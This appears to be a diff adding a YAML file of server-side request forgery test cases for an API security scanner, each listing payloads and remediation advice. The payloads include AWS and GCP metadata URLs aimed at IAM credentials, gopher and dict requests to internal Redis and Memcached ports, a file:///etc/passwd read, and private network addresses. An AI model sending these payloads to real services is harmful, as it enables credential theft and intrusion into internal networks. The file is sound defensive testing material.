@@ -1,0 +1,162 @@
+# SSRF - Server Side Request Forgery Tests
+# Reference: CWE-918, OWASP API4-2023
+
+api_version: "1.0"
+category: SSRF
+
+test_cases:
+
+  - id: SSRF-001
+    name: SSRF via localhost access
+    severity: HIGH
+    category: SSRF
+    cwe_id: CWE-918
+    owasp_ref: API4-2023
+    description: |
+      Test for SSRF by accessing localhost or internal services.
+    vuln_type: SSRF
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://localhost"
+      - "http://127.0.0.1"
+      - "http://[::1]"
+      - "http://0.0.0.0"
+    expected_response:
+      status_code: 200
+    validation:
+      type: internal_access
+      indicators:
+        - content_length_less_than_1000
+    remediation: |
+      Validate and sanitize user-supplied URLs.
+      Use allowlists for permitted destinations.
+      Disable unnecessary protocols.
+
+  - id: SSRF-002
+    name: SSRF via AWS metadata service
+    severity: CRITICAL
+    category: SSRF
+    cwe_id: CWE-918
+    description: |
+      Test for SSRF accessing AWS metadata service to steal credentials.
+    vuln_type: SSRF
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://169.254.169.254/latest/user-data/"
+      - "http://169.254.169.254/latest/dynamic/instance-identity/"
+    expected_response:
+      status_code: 200
+    validation:
+      type: cloud_metadata
+      indicators:
+        - "ami"
+        - "instance-id"
+        - "security-credentials"
+    remediation: |
+      Block access to cloud metadata endpoints.
+      Use network segmentation.
+      Validate URLs against allowlist.
+
+  - id: SSRF-003
+    name: SSRF via GCP metadata service
+    severity: CRITICAL
+    category: SSRF
+    cwe_id: CWE-918
+    description: |
+      Test for SSRF accessing Google Cloud metadata service.
+    vuln_type: SSRF
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://metadata.google.internal/computeMetadata/v1/instance/hostname"
+      - "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+    expected_response:
+      status_code: 200
+    validation:
+      type: cloud_metadata
+      indicators:
+        - "metadata"
+        - "instance"
+    remediation: |
+      Block access to cloud metadata endpoints.
+      Use VPC or firewall rules.
+      Validate URLs.
+
+  - id: SSRF-004
+    name: SSRF via protocol manipulation
+    severity: HIGH
+    category: SSRF
+    cwe_id: CWE-918
+    description: |
+      Test for SSRF using various protocols (gopher, dict, file).
+    vuln_type: SSRF
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "gopher://127.0.0.1:6379/_INFO"
+      - "dict://localhost:11211/VERSION"
+      - "file:///etc/passwd"
+      - "sftp://localhost:22"
+    expected_response:
+      status_code: 200
+    validation:
+      type: protocol_exploitation
+      indicators:
+        - "redis"
+        - "dict"
+        - "root:"
+    remediation: |
+      Disable unnecessary URL schemes.
+      Use allowlists for permitted protocols.
+      Sanitize user input.
+
+  - id: SSRF-005
+    name: SSRF via DNS rebinding
+    severity: HIGH
+    category: SSRF
+    cwe_id: CWE-918
+    description: |
+      Test for SSRF using DNS rebinding techniques.
+    vuln_type: SSRF
+    method: GET
+    path: /api/{endpoint}
+    parameters:
+      - name: url
+        type: string
+        location: query
+    payloads:
+      - "http://internal.corp.example.com"
+      - "http://10.0.0.1"
+      - "http://172.16.0.0/12"
+      - "http://192.168.0.0/16"
+    expected_response:
+      status_code: 200
+    validation:
+      type: internal_network_access
+      indicators:
+        - internal_content
+    remediation: |
+      Resolve DNS at server side only.
+      Use DNS pinning.
+      Validate against internal ranges.
